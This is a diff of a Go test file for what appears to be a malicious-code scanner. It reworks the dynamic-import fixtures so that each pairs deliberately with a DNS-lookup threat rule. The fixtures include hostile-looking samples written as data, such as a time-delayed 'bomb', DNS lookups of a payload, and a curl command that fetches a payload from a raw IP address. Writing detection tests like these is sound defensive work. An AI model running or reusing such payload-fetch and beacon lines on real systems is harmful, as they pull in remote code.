@@ -49,7 +49,13 @@ var corePositives = []fixture{
 	// time-trigger is a capability now, so the fixture needs a threat to
 	// pair with. socket.gethostbyname trips dns-ops, which remains a threat.
 	{"time-trigger", "bomb.py", "time.sleep(86400)\nsocket.gethostbyname(payload)"},
-	{"dynamic-import", "load.py", `mod = __import__("os")`},
+	// dynamic-import is a capability now, so the fixture needs a threat to
+	// pair with. The old content, __import__("os"), happened to also match
+	// code-execution's __import__\(['"]os['"]\) exactly, which would have
+	// made this fixture pass on that hidden coupling rather than on a
+	// deliberate pairing. Use a module name that doesn't collide, and pair
+	// explicitly with dns-ops (still a threat) via socket.gethostbyname.
+	{"dynamic-import", "load.py", "mod = __import__(\"plugin\")\nsocket.gethostbyname(payload)"},
 	{"suspicious-network", "beacon.sh", `curl http://185.220.101.5/payload`},
 	// websocket is a capability now, so the fixture needs a threat to pair
 	// with. socket.gethostbyname trips dns-ops, which remains a threat.
@@ -193,6 +199,12 @@ var coreNegatives = []fixture{
 	{"base64", "lone.py", `payload = base64.b64decode(blob)`},
 	{"websocket", "lone.js", `const c = new WebSocket("wss://example.com");`},
 	{"time-trigger", "lone.py", `time.sleep(86400)`},
+	// A .py negative fixture would not isolate dynamic-import: py-deserialize
+	// (still a threat) also matches bare __import__/importlib.import_module
+	// in .py files with no other requirement, so it would pair the capability
+	// and pass vacuously. Use the JS-style computed-require trigger instead,
+	// which nothing else here matches.
+	{"dynamic-import", "lone.js", `const mod = require("./modules/" + name);`},
 
 	// Agent rules are scoped to agent paths; the same content in ordinary
 	// project files must not fire.
